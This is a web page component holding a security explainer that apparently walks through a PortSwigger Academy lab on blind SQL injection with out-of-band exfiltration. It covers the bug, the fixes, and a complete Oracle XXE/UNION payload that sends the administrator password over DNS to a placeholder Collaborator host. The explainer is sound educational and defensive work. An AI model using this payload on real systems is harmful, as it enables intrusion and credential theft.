import WriteupArticle from "../../components/WriteupArticle";
import Reveal from "../../components/Reveal";
import GlowDivider from "../../components/GlowDivider";

export const metadata = {
  description: "SQL injection explainer: blind SQLi with out-of-band data exfiltration, the hardest Practitioner lab in the topic on PortSwigger Academy. How it works, the payload, and the fix.",
  title: "SQL injection, blind with out-of-band exfiltration, explained | hannan.",
};

function Section({ title, children }) {
  return (
    <Reveal tag="section" className="py-8">
      <h2 className="mt-3 text-xl text-[#F5F2ED] sm:text-2xl">{title}</h2>
      <div className="mt-4 space-y-4 text-sm leading-relaxed text-[#F5F2ED]">{children}</div>
    </Reveal>
  );
}

function Code({ children }) {
  // This payload is one very long line, so it wraps instead of scrolling
  // sideways. The wrapping is visual only, copying it still gives one line.
  return (
    <pre className="overflow-x-auto whitespace-pre-wrap break-all rounded-xl border border-[#262626] bg-[#111111] p-4 font-mono text-sm leading-relaxed text-[#F5F2ED]">
      <code>{children}</code>
    </pre>
  );
}

export default function SqlInjectionOutOfBand() {
  return (
    <WriteupArticle
      title="SQL injection, blind with out-of-band exfiltration, explained"
      date="PortSwigger Academy, Practitioner"
      category="Vulnerability explainer"
      readingTime="5 min read"
    >
      <p>
        This is an explainer, not a lab diary. Each post in this series teaches one vulnerability and
        walks through the hardest Practitioner lab for it on PortSwigger Academy, step by step, with
        the real payloads. There are no screenshots here, the labs are public and you can run them
        yourself.
      </p>
      <p>
        SQL injection is when user input ends up inside a database query, so the attacker gets to
        rewrite the query. The classic version is loud: the page shows you the data you asked for. The
        blind version is quiet: the page shows you nothing at all. This lab is the blind version, and
        the answer has to leave the server through a side channel, a DNS lookup.
      </p>

      <GlowDivider />

      <Section title="The bug">
        <p>
          The lab is a shopping site. Every visit sets a TrackingId cookie, and the site uses that
          cookie in a database query. The cookie is injectable, so a quote in it breaks out of the
          query. The catch is that the query runs asynchronously, the page never shows the result, and
          there is no error message to read. You can ask the database anything, but it will not answer
          you on the page.
        </p>
        <p>
          So you need the database to answer somewhere else. That is what out-of-band means: instead
          of reading the result in the response, you make the database call out to a server you
          control, with the answer hidden inside the call.
        </p>
      </Section>

      <GlowDivider />

      <Section title="The worked example">
        <p>
          The lab is Blind SQL injection with out-of-band data exfiltration, Practitioner level, on
          PortSwigger Academy. The goal is the administrator password, and the way out is DNS.
        </p>
        <p>
          Oracle has a function, EXTRACTVALUE, that parses XML. If the XML contains an external
          entity, the database fetches the URL in that entity to resolve it. So you build a UNION
          SELECT that hands the database a piece of XML, and inside the XML you put an entity whose
          URL contains the admin password, followed by your Collaborator domain. The database does a
          DNS lookup for that name, and the password shows up in the Collaborator log as a subdomain.
        </p>
        <p>
          Put this in the TrackingId cookie, replacing the Collaborator part with your own Burp
          Collaborator subdomain. You need Burp Suite Professional for Collaborator, or any domain
          where you can see the DNS lookups.
        </p>
        <Code>{`' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.<COLLABORATOR>/"> %remote;]>'),'/l') FROM dual--`}</Code>
        <p>
          What happens, piece by piece. The quote closes the original query. The UNION SELECT runs a
          second query. EXTRACTVALUE forces the database to parse the XML. The entity in the XML
          points at a URL built from the admin password, so the database resolves that URL over DNS.
          The password arrives in the Collaborator log, and you log in as administrator with it.
        </p>
        <p>
          Three things make this the hardest Practitioner SQLi lab. The injection point is a cookie,
          not a visible form field. The query gives back nothing, so you have to think in side
          channels. And the exfiltration uses two ideas at once, XML external entities and DNS, inside
          a SQL payload.
        </p>
      </Section>

      <GlowDivider />

      <Section title="The fix">
        <p>
          <strong>Parameterized queries.</strong> The input should be a value in the query, never
          part of the query itself. Prepared statements do this. String concatenation does not, and no
          amount of filtering fixes that.
        </p>
        <p>
          <strong>Least privilege for the database user.</strong> The web app database user should
          only be able to do what the app needs. If it cannot read the users table, or cannot make
          outbound network calls, this exact attack fails even if the injection is still there.
        </p>
        <p>
          <strong>Block outbound DNS from the database.</strong> Out-of-band exfiltration needs the
          database to reach the internet. If it cannot resolve external names, the password has
          nowhere to go.
        </p>
      </Section>

      <GlowDivider />

      <p className="text-sm text-[#8A8A8A]">
        Lab: Blind SQL injection with out-of-band data exfiltration, PortSwigger Web Security Academy, Practitioner level. Run it yourself on the Academy, it is free.
      </p>
      <p>
        <a href="/writeups" className="font-semibold text-[#F5F2ED] underline underline-offset-4">
          Back to Writeups
        </a>
      </p>
    </WriteupArticle>
  );
}
